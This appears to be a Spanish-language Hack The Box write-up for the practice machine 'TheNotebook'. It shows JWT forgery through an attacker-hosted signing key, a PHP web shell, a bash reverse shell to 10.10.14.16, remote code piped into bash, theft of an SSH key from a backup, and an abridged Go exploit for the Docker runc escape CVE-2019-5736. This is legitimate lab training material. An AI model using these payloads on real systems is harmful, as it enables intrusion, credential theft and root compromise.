---
layout: single
title: Notebook - Hack The Box
excerpt: "Esta máquina ha sido algo complicada, sobre todo por el tema de enumeración y encontrar rutas ocultas y mucha explotación web"
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-awkward/awkward1.png
categories:
  - hackthebox
  - infosec
tags:
  - hackthebox
  - binary exploit  
---

# 10.10.10.230 - TheNotebook
![](/assets/images/htb-notebook/notebook1.png)

----------------------------

# Part 1: Enumeracion básica

Puertos abiertos 22, 80

```console
└─$ whatweb http://10.10.10.230/
Bootstrap, HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], Title[The Notebook - Your Note Keeper]

# La enumeracion por subdominios no da resultado. Tampoco fuzzing por rutas php ni por directorios acabados en "/"

└─$ wfuzz -t 200 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.230/FUZZ
000000052:   200        32 L     104 W      1422 Ch     "register"
000000040:   200        30 L     94 W       1250 Ch     "login"
000000246:   403        0 L      1 W        9 Ch        "admin"
```
----------------------------
# Part 2: Analizando la web

La web es muy simple, apenas tiene tiene una pestaña de login y otra de register. La seccion /admin da un 403 
unauthorized obviamente.
![](/assets/images/htb-notebook/notebook2.PNG)

Cuando nos registramos ```POST a /register -> cucuxii:cucuxii:cucuxii@htb.htb```
Una vez registrados hay una seccion /Notes
![](/assets/images/htb-notebook/notebook3.PNG)

Intento crear una nota con un payload STTI {{4\*4}} por titulo y contenido pero no lo interpreta.
![](/assets/images/htb-notebook/notebook4.PNG)

En la url pone ```http://10.10.10.230/6e1ed97a-2a06-4e7b-84a3-047e03fc347f/notes/5``` si en vez de 5 ponemos otro
numero nos da unauthorized. Intento poner una comilla tras el numero para causar un error sql pero tambien 
sale lo mismo.

Si nos vamos a la seccion de almacenamiento del navegador para ver las cookies nos salen dos
- "uuid" -> 6e1ed97a-2a06-4e7b-84a3-047e03fc347f (lo mismo que la url)
- "auth" -> base 64 largo

SI decodificamos la auth:
```console
└─$ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6...8a_FgO79JM" | tr -d "." | base64 -d
{"typ":"JWT","alg":"RS256","kid":"http://localhost:7070/privKey.key"}{"username":"cucuxii","email":"cucuxii@htb.htb","admin_cap":0}base64: entrada inválida
```
Supongo que para entrar en admin hay que cocinar una cookie con "admin_cap":"1" pero para eso necestariamos una
llave.

Antes de ponernos con el jwt miramos si hay algo mas:
```console
└─$ wfuzz -t 200 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.230/6e1ed97a-2a06-4e7b-84a3-047e03fc347f/FUZZ
000001075:   200        61 L     125 W      2000 Ch     "notes"
└─$ wfuzz -t 200 --hc=404,401 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.230/6e1ed97a-2a06-4e7b-84a3-047e03fc347f/notes/FUZZ
000000084:   200        55 L     110 W      1705 Ch     "5"
000000430:   500        4 L      40 W       290 Ch      "add"
```

-------------------------------
# Part 3: Json Web Token exploitation

Si decodificamos la cookie con el [jwt.io](https://jwt.io) vemos que pone ```"kid"="http://localhost:7070/privKey.key"```
El sistema esa buscando en esta ruta ```http://localhost:7070/privKey.key``` la llave para validar la cookie.
Generamos nosotros una llave de 2048 bytes  ```openssl genrsa -out llave.key 2048 # Nos genera una llave.key de 2048 bytes```

Lo que queda es copiarla, crear una jwt con ella en jwt.io:
- La llave (llave.key) va en el campo private key  
- Cambiamos lo de *admin_cap* a 1  
- La servimos desde nuestro sistema -> ```sudo python3 -m http.server 80``` por tanto ```"kid": "http://10.10.14.16/llave.key"``` 
![](/assets/images/htb-notebook/notebook5.PNG)

Ya con eso tenemos el admin_panel

-----------------------------
# Part 3: Accediendo al sistema

El boton /admin_panel nos lleva a la ruta admin. Hay un sitio para subir archivos pero tambien otro con notas
```
1. Se necesita arreglar configuracion (admin) -> Hay que fixear el problema donde se ejcutan los php ":/". Esto puede ser un riesgo potencial.
2. Hay una tarea que se encarga de los backups (admin) -> Los backups a menudo son necesarios. Gracias a dios que es tan facil todo en el servidor.
3. Frases del Diario de Noa (noah) -> Una diálogo de la película...
4. Están mis datos a salvo? (noah) -> Me pregunto si el administrador es lo suficiente bueno para confiar en él
```

![](/assets/images/htb-notebook/notebook6.PNG)

Si subimos en uploads un shell.php con este contenido... ```<?php system($_REQUEST['cmd']); ?>```
Nos dan la ruta c214a2fb80bab315fc328a5eff2892b5.php (hace un md5) -> ```md5sum shell.php c214a2fb80bab315fc328a5eff2892b5  shell.php```

Hay un botón de "view" para acceder ```http://10.10.10.230/c214a2fb80bab315fc328a5eff2892b5.php```
```console
└─$ curl -s http://10.10.10.230/c214a2fb80bab315fc328a5eff2892b5.php?cmd=whoami
www-data
```

Si no hay reglas de firewall, tendríamos acceso al sistema.
```http://10.10.10.230/c214a2fb80bab315fc328a5eff2892b5.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.16/443 0>%261'```

Subimos nuestro [script](https://github.com/CUCUxii/Pentesting-tools/blob/main/lin_info_xii.sh) de reconocimiento
```console
www-data@thenotebook:/tmp$ curl -s http://10.10.14.16/lin_info_xii.sh | bash
...
	>  Backups
/var/backups/home.tar.gz

www-data@thenotebook:/var/backups$ cp ./home.tar.gz /tmp
www-data@thenotebook:/tmp$ tar -xf home.tar.gz
www-data@thenotebook:/tmp$ cd ./home/noah/.ssh
www-data@thenotebook:/tmp/home/noah/.ssh$ cat id_rsa  # La llave de noah
└─$ chmod 600 id_rsa
└─$ ssh -i id_rsa noah@10.10.10.230
```

--------------------------
# Part 4: Docker breackout

Enumeramos otra vez el sistema y nos topamos con:
```console
  >  SUDO NO PASSWD (sudo -l)
(ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*

noah@thenotebook:/tmp$ sudo /usr/bin/docker exec -it webapp-dev01
Usage:  docker exec [OPTIONS] CONTAINER COMMAND [ARG...]. Run a command in a running container

noah@thenotebook:/tmp$ sudo /usr/bin/docker exec -it webapp-dev01 "whoami" # -> root
noah@thenotebook:/tmp$ sudo /usr/bin/docker exec -it webapp-dev01 bash 
root@0f4c2517af40:/opt/webapp#
```
Ya con eso estamos en el contenedor.
Este directorio tiene la web:
```console
root@0f4c2517af40:/opt/webapp# ls
__pycache__  admin  create_db.py  main.py  privKey.key	requirements.txt  static  templates  webapp.tar.gz
root@0f4c2517af40:/opt/webapp# cat create_db.py
(...)
User(username='admin', email='admin@thenotebook.local', uuid=admin_uuid, admin_cap=True, password="0d3ae6d144edfb313a9f0d32186d4836791cbfd5603b2d50cf0d9c948e50ce68"),
User(username='noah', email='noah@thenotebook.local', uuid=noah_uuid, password="e759791d08f3f3dc2338ae627684e3e8a438cd8f87a400cada132415f48e01a2")
(...)
```
Pero no las podemos romper.
Encuentro en google [esto](https://github.com/Frichetten/CVE-2019-5736-PoC) al poner ```docker 18.06.0-ce exploits github```
```console
noah@thenotebook:~$ docker --version
Docker version 18.06.0-ce, build 0ffa825

└─$ git clone https://github.com/Frichetten/CVE-2019-5736-PoC 
└─$ cd CVE-2019-5736-PoC; cat main.go
# var payload = "#!/bin/bash \n chmod u+s /bin/bash"
└─$ go build -ldflags "-s -w" main.go
└─$ upx main # reducir su tamaño

noah@thenotebook:/tmp$ curl -s http://10.10.14.16/main -O
noah@thenotebook:/tmp$ chmod +x main
noah@thenotebook:/tmp$ hostname -I
10.10.10.230 172.17.0.1

noah@thenotebook:/tmp$ python3 -m http.server 6666
root@0f4c2517af40:/tmp# curl -s http://172.17.0.1:6666/main -O
root@0f4c2517af40:/tmp# chmod +x main
```
Ejecutamos el payload:

```console
root@e9b5f5fae303:/opt/webapp# ./main # -> [+] Overwritten /bin/sh successfully
noah@thenotebook:/tmp$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh   # -> No help topic for '/bin/sh'
noah@thenotebook:/tmp$ ls -l /bin/bash # -> -rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
noah@thenotebook:/tmp$ bash -p
bash-4.4# 4
```
--------------------------
# Extra: como funciona el exploit

[Fuente](https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d)
```
El exploit se aprovecha de "runc" que es el sistema que corre los contenedores.
El ataque se realiza o cuando inicias un contenedor o te conectas a uno en ejecucion. Consiste en remplazar
el binario de destino (ej /bin/bash) del contenedor con uno malicioso que apunta hacia runc.

El malicioso que sustituye a /bin/bash apunta al interprete #!/proc/self/exe que es un enlace simbolico 
al "docker exec/runC"  

Como el kernel no permite escritura y ejecucion a la vez el script abre un descriptor de archivo en /proc/self/exe
usando "O_PATH" y lo reabre con "O_WRONLY" a traves de /proc/self/fd/PID_de_runc por tanto se separan los procesos

Cuando ejecuts runC este se reescribe y ejecuta a la vez por el #!/proc/self/exe. 
```
El tema con este exploit esque si no hace un backup rutinario de runC este al sovreescribirse se destruye y el 
sistema no puede correr dockers más.


Aqui está el exploit, lo he abreviado asi que no funcionará, asi que copien el del repo.
```go
package main
import ( "fmt" "io/ioutil" "os" "strconv" "strings" "flag")
var shellCmd string

func init() {
    flag.StringVar(&shellCmd, "shell", "", "Execute arbitrary commands")
    flag.Parse()}

func main() {
    // El comando que se ejecutará como root
    var payload = "#!/bin/bash \n chmod u+s /bin/bash"
    // Sobreescribir /bin/sh cone "/proc/self/exe" el interprete del runc
    fd := os.Create("/bin/sh")
    fmt.Fprintln(fd, "#!/proc/self/exe")
    fmt.Println("[+] Overwritten /bin/sh successfully")

    // Loop para encontrar el proceso correspondiente al runc
    var found int
    for found == 0 {
        pids := ioutil.ReadDir("/proc")
        for _, f := range pids {
            fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
            fstring := string(fbytes)
            if strings.Contains(fstring, "runc") {
                fmt.Println("[+] Found the PID:", f.Name())
                found = strconv.Atoi(f.Name())}}}

    // El pid sirve para abrir runc con la ruta alternativa para ejecutarlo/rescribirlo a la par
    var handleFd = -1
    for handleFd == -1 {
        // Note, la flag O_PATH no es imprescindible.
        handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
        if int(handle.Fd()) > 0 {
            handleFd = int(handle.Fd())}

    fmt.Println("[+] Successfully got the file handle")

    // Ahora sobreescribimos el binario 
    for {
        writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
        if int(writeHandle.Fd()) > 0 {
            fmt.Println("[+] Successfully got write handle", writeHandle)
            fmt.Println("[+] The command executed is" + payload)
            writeHandle.Write([]byte(payload))
            return}}}
```

